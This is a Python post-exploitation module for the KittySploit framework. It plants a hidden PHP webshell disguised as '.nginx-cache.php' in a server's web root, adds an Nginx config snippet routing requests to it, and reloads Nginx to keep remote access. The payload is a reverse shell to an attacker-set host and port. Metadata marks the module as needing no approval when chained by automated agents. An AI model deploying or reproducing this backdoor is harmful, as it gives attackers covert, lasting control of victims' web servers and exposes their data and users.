#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "Nginx + PHP-FPM Backdoor",
        "description": (
            "Deploys a hidden PHP webshell and an Nginx snippet (conf.d or sites-enabled) "
            "routing requests to PHP-FPM."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["persistence", "nginx", "php-fpm", "web"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    web_dir = OptString("/var/www/html", "Document root for the PHP backdoor file", True)
    shell_name = OptString(".nginx-cache.php", "PHP backdoor filename under web_dir", False)
    conf_path = OptString(
        "",
        "Nginx include path (empty = auto /etc/nginx/conf.d/ks-backdoor.conf)",
        False,
    )
    fastcgi_socket = OptString(
        "",
        "PHP-FPM socket or host:port (empty = auto-detect from /run/php)",
        False,
    )
    payload_path = OptString("", "Payload module (e.g. payloads/singles/cmd/php/reverse_tcp)", True)
    target = OptChoice("PHP", "Payload embedding", True, choices=["PHP", "Linux command"])
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)
    reload_nginx = OptBool(True, "Run nginx -t && systemctl reload nginx after deploy", False)

    def _shell_path(self) -> str:
        base = self._opt(self.web_dir).rstrip("/")
        name = self._opt(self.shell_name).lstrip("/") or ".nginx-cache.php"
        return f"{base}/{name}"

    def _nginx_conf_path(self) -> str:
        custom = self._opt(self.conf_path)
        if custom:
            return custom
        return "/etc/nginx/conf.d/ks-backdoor.conf"

    def _nginx_running(self) -> bool:
        out = self.linux_execute("ps aux 2>/dev/null | grep -E '[n]ginx' || true")
        return bool(out and out.strip())

    def _php_fpm_running(self) -> bool:
        out = self.linux_execute("ps aux 2>/dev/null | grep -E '[p]hp-fpm|[p]hp[0-9.]*-fpm' || true")
        return bool(out and out.strip())

    def _detect_fastcgi(self) -> str:
        manual = self._opt(self.fastcgi_socket)
        if manual:
            return manual
        sock = self.linux_execute("ls /run/php/*.sock 2>/dev/null | head -n 1")
        if sock and sock.strip():
            return f"unix:{sock.strip()}"
        for cfg in ("/etc/nginx/nginx.conf", "/etc/nginx/sites-enabled/default"):
            if self.file_exist(cfg):
                content = self.read_file(cfg)
                match = re.search(r"fastcgi_pass\s+([^;]+);", content or "")
                if match:
                    return match.group(1).strip()
        return ""

    def check(self):
        if not self._nginx_running():
            print_error("Nginx does not appear to be running")
            return False
        if not self._php_fpm_running():
            print_error("PHP-FPM does not appear to be running")
            return False
        if not self._detect_fastcgi():
            print_error("Could not detect PHP-FPM fastcgi_pass target")
            return False
        web = self._opt(self.web_dir)
        if not self._writable_target(self._shell_path(), web):
            print_error(f"Web directory not writable: {web}")
            return False
        conf = self._nginx_conf_path()
        conf_dir = conf.rsplit("/", 1)[0]
        if not self._writable_target(conf, conf_dir):
            print_error(f"Nginx config path not writable: {conf}")
            return False
        print_success("Nginx, PHP-FPM, and target paths look usable")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        encoded = self._generate_payload()
        shell_path = self._shell_path()
        conf_path = self._nginx_conf_path()
        fastcgi = self._detect_fastcgi()
        uri = "/" + shell_path.split("/")[-1]

        self._maybe_backup(shell_path, "nginx_shell")
        self._maybe_backup(conf_path, "nginx_conf")

        print_status(f"Writing PHP shell to {shell_path}")
        if not self._write_remote_file(shell_path, self._php_file_content(encoded), mode="0644"):
            raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {shell_path}")

        nginx_snippet = f"""# KittySploit persistence snippet
location = {uri} {{
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME {shell_path};
    fastcgi_pass {fastcgi};
}}
"""
        print_status(f"Writing Nginx snippet to {conf_path}")
        if not self._write_remote_file(conf_path, nginx_snippet, mode="0644"):
            raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {conf_path}")

        if self.reload_nginx:
            test = self.linux_execute("nginx -t 2>&1")
            if test and "successful" in test.lower():
                self.linux_execute("(systemctl reload nginx 2>/dev/null || service nginx reload 2>/dev/null || nginx -s reload 2>/dev/null)")
                print_status("Nginx reloaded")
            else:
                print_warning(f"nginx -t failed; reload skipped: {test}")

        print_good("Nginx + PHP-FPM backdoor installed.")
        print_status(f"Access via HTTP GET {uri} on the vhost using this server block.")
        return True
